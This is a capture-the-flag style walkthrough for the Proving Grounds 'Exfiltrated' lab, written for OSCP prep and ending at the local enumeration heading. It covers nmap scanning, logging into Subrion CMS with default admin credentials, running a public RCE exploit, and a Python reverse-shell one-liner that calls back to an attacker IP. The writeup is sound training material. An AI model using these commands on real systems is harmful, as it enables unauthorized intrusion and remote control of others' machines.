---
title: Proving Grounds Exfiltrated Walkthrough
date: 2022-08-08 12:37:00 -500 
categories: [OSCP Prep,Proving Grounds]
tags: [oscp,linux]
---

# Exfiltrated Overview

Machine Details:

|IP|Hostname|Operating System|
|---|---|---|
|192.168.x.163|Exfiltrated|Linux|

# Enumeration

## Full Port Scan

```bash
$ nmap 192.168.109.163 -p- -oA Exfiltrated/nmap/full-port --open -Pn -vv
```

Which Resulted in:

|PORT|SERVICE|
|----|-------|
|22|ssh|
|80|http|

## Service Scan

```bash
$ nmap 192.168.109.163 -p 22,80 -sC -sV -oA Exfiltrated/nmap/service-scan -Pn
```

Which Resulted in:

|PORT|SERVICE|VERSION|
|----|-------|-------|
|22|ssh|8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)|
|80|http|httpd 2.4.41 ((Ubuntu))|

# Website Enumeration

![alt text](/_posts/src/Exfiltarted-src/site-landing-page.png "Site Page")

We see the server is running Subrion CMS 4.2.1 which has an [Authenticated RCE](https://www.exploit-db.com/exploits/49876). We can guess the default credentials admin:admin and see that we can now login to the application

![alt text](/_posts/src/Exfiltarted-src/valid-creds.png "Valid Credentials")

We can now use the exploit and supply it the credentials for the application

```bash
$ python3 exploit.py -u http://192.168.109.163/panel/ -l admin -p admin 
```

And we see that we have command execution on the box

![alt text](/_posts/src/Exfiltarted-src/command-exec.png "Confirmed Command Exec")

We can get a reverse shell by setting up a listener and running the following python command
```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.109",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
# Local Enumeration

